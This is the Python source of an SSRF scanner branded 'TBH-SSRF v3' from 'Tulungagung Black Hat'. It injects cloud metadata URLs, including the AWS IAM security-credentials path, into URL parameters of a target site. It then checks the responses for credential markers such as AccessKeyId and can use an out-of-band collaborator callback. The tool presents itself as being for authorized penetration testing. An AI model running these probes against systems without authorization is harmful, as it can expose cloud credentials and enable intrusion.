#!/usr/bin/env python3
"""TBH-SSRF v3 - Server-Side Request Forgery signal detector (authorized testing only).

Default probes target cloud metadata endpoints. Point --collab at Burp
Collaborator / interactsh for out-of-band confirmation.
"""
import argparse, json, os, sys, time, urllib.parse

try:
    import requests
except ImportError:
    print("[!] requests required: pip install requests", file=sys.stderr)
    sys.exit(2)

VERSION = "3.1"
REPO = "https://github.com/TulungagungBlackHat/TBH-SSRF"

def banner():
    if os.environ.get("NO_COLOR"):
        return ""
    return ("\033[91m╔════════════════════════════════════╗\n"
            "║ \033[97mTBH-SSRF v3\033[91m - Metadata + OOB      \033[91m║\n"
            "║ \033[90mTulungagung Black Hat | uchil404 \033[91m║\n"
            "╚════════════════════════════════════╝\033[0m")

def color(code, text, enabled=True):
    return f"\033[{code}m{text}\033[0m" if enabled else text

METADATA_PROBES = [
    ("http://169.254.169.254/latest/meta-data/", ["meta-data", "ami-id", "instance-id"], "aws-legacy"),
    ("http://169.254.169.254/latest/meta-data/iam/security-credentials/", ["AccessKeyId", "Signature"], "aws-iam"),
    ("http://metadata.google.internal/computeMetadata/v1/", ["computeMetadata", "instance"], "gcp"),
    ("http://100.100.100.200/latest/meta-data/", ["meta-data"], "aliyun"),
    ("http://169.254.169.254/metadata/instance", ["compute", "subscriptionId"], "azure"),
]
PARAM_CANDIDATES = ["url", "uri", "link", "dest", "destination", "redirect", "redirect_uri",
                    "callback", "next", "feed", "site", "image", "img", "src", "path", "page"]

def build_session(args):
    s = requests.Session()
    s.headers["User-Agent"] = f"TBH-SSRF/{VERSION} (+{REPO})"
    if args.cookie:
        s.headers["Cookie"] = args.cookie
    for h in args.header or []:
        name, _, val = h.partition(":")
        if not val:
            raise SystemExit(f"[!] bad -H value: {h!r}")
        s.headers[name.strip()] = val.strip()
    if args.proxy:
        s.proxies = {"http": args.proxy, "https": args.proxy}
    return s

def inject(url, param, value):
    p = urllib.parse.urlparse(url)
    qs = urllib.parse.parse_qs(p.query, keep_blank_values=True)
    if param is None:
        param = next((c for c in PARAM_CANDIDATES if c in qs), next(iter(qs), "url"))
    qs[param] = [value]
    return urllib.parse.urlunparse(p._replace(query=urllib.parse.urlencode(qs, doseq=True))), param

def target_params(url, requested):
    qs = urllib.parse.parse_qs(urllib.parse.urlparse(url).query, keep_blank_values=True)
    if requested and requested != "all":
        return [requested]
    return list(qs.keys()) or ["url"]

def scan(session, url, args):
    findings = []
    params = target_params(url, args.param)
    probes = list(METADATA_PROBES)
    if args.collab:
        probes.insert(0, (args.collab, [], "collab-oob"))

    try:
        b = session.get(url, timeout=args.timeout, allow_redirects=True)
        baseline = {"status": b.status_code, "length": len(b.text)}
    except requests.RequestException as e:
        return {"error": f"baseline failed: {e}"}

    for param in params:
        for payload, markers, kind in probes:
            test_url, _ = inject(url, param, payload)
            try:
                r = session.get(test_url, timeout=args.timeout, allow_redirects=False)
            except requests.RequestException as e:
                findings.append({"param": param, "payload": payload, "error": str(e), "verdict": "error"})
                continue
            hit = any(m.lower() in r.text.lower() for m in markers) if markers else False
            reflected = payload in r.text
            if hit:
                findings.append({"param": param, "payload": payload, "url": test_url, "kind": kind,
                                 "status": r.status_code, "markers": markers, "verdict": "ssrf"})
            elif reflected and kind == "collab-oob":
                findings.append({"param": param, "payload": payload, "url": test_url, "kind": kind,
                                 "status": r.status_code, "verdict": "reflected",
                                 "note": "callback URL reflected in response - check collaborator"})
            if args.delay:
                time.sleep(args.delay)

    return {"tool": "TBH-SSRF", "version": VERSION, "target": url,
            "baseline": baseline, "findings": findings}

def main():
    parser = argparse.ArgumentParser(description=f"TBH-SSRF v{VERSION} - SSRF signal detector")
    parser.add_argument("-u", "--url", help="URL whose parameter accepts a URL")
    parser.add_argument("--targets", help="file with one URL per line (multi-target)")
    parser.add_argument("--param", help="parameter name, or 'all' (default: auto-detect url-ish param)")
    parser.add_argument("--collab", help="OOB callback URL (Burp Collaborator / interactsh)")
    parser.add_argument("--proxy", help="e.g. http://127.0.0.1:8080 (Burp)")
    parser.add_argument("--cookie", help="Cookie header value")
    parser.add_argument("-H", "--header", action="append", help="extra header, repeatable")
    parser.add_argument("--timeout", type=float, default=10.0)
    parser.add_argument("--delay", type=float, default=0.0)
    parser.add_argument("--json", help="save JSON report")
    parser.add_argument("--no-color", action="store_true")
    parser.add_argument("--version", action="version", version=f"TBH-SSRF {VERSION}")
    args = parser.parse_args()
    if not args.url and not args.targets:
        parser.error("-u or --targets is required")
    if args.targets:
        import subprocess
        targets = [args.url] if args.url else []
        try:
            with open(args.targets) as fh:
                targets += [ln.strip() for ln in fh
                            if ln.strip() and not ln.strip().startswith("#")]
        except OSError as e:
            print(f"[!] cannot read targets file: {e}", file=sys.stderr)
            sys.exit(2)
        if not targets:
            print("[!] no targets to scan", file=sys.stderr)
            sys.exit(2)
        codes = []
        for i, t in enumerate(x if "://" in x else "https://" + x
                               for x in targets):
            if i:
                print("-" * 40, flush=True)
            cmd = [sys.executable, os.path.abspath(__file__), "-u", t]
            for k, v in vars(args).items():
                if k in ("url", "targets") or v is None or v is False:
                    continue
                flag = "--" + k.replace("_", "-")
                if k == "json":
                    v = f"{v}.tbh{i}"
                if isinstance(v, list):
                    for item in v:
                        cmd += [flag, str(item)]
                elif isinstance(v, bool):
                    cmd.append(flag)
                else:
                    cmd += [flag, str(v)]
            codes.append(subprocess.call(cmd))
        if args.json:
            merged = []
            for i in range(len(targets)):
                path = f"{args.json}.tbh{i}"
                try:
                    with open(path) as fh:
                        merged.append(json.load(fh))
                except (OSError, ValueError):
                    pass
                finally:
                    try:
                        os.remove(path)
                    except OSError:
                        pass
            if merged:
                payload = (merged[0] if len(merged) == 1 else
                           {"tool": "TBH-SSRF", "version": VERSION,
                            "summary": {"targets": len(merged),
                                        "findings": sum(len(r.get("findings", [])) for r in merged)},
                            "targets": merged})
                try:
                    with open(args.json, "w") as fh:
                        json.dump(payload, fh, indent=2)
                    print(f"[\u2713] JSON: {args.json}")
                except OSError as e:
                    print(f"[!] cannot write JSON: {e}", file=sys.stderr)
                    sys.exit(2)
        sys.exit(1 if any(c == 1 for c in codes) else (2 if any(c == 2 for c in codes) else 0))
    print(banner())

    use_color = not args.no_color and not os.environ.get("NO_COLOR")
    print(color("91", "[!] Authorized targets only. Metadata probes are safe reads; OOB needs your collaborator.", use_color))
    if not args.collab:
        print(color("93", "[i] Tip: --collab https://xyz.burpcollaborator.net for out-of-band proof", use_color))
    print(f"[*] Scanning {args.url}")
    try:
        session = build_session(args)
    except SystemExit as e:
        print(e, file=sys.stderr)
        sys.exit(2)

    report = scan(session, args.url, args)
    if "error" in report:
        print(color("91", f"[!] {report['error']}", use_color))
        sys.exit(2)

    vuln = 0
    for f in report["findings"]:
        if f.get("verdict") == "ssrf":
            vuln += 1
            print(color("91", f"[!] SSRF signal on {f['param']}: kind={f['kind']} markers={f['markers']}", use_color))
        elif f.get("verdict") == "reflected":
            print(color("96", f"[*] {f['param']}: {f.get('note', '')}", use_color))
        elif f.get("verdict") == "error":
            print(color("90", f"[-] {f['param']}: {f['error']}", use_color))

    if args.json:
        report["summary"] = {"ssrf_signals": vuln}
        try:
            with open(args.json, "w") as fh:
                json.dump(report, fh, indent=2)
            print(f"[✓] JSON: {args.json}")
        except OSError as e:
            print(color("91", f"[!] cannot write JSON: {e}", use_color), file=sys.stderr)
            sys.exit(2)

    if vuln:
        print(color("91", f"[!] {vuln} SSRF signal(s) - confirm with collaborator before reporting", use_color))
        sys.exit(1)
    print(color("92", "[✓] No SSRF signals (use --collab for OOB confirmation)", use_color))
    sys.exit(0)

if __name__ == "__main__":
    main()
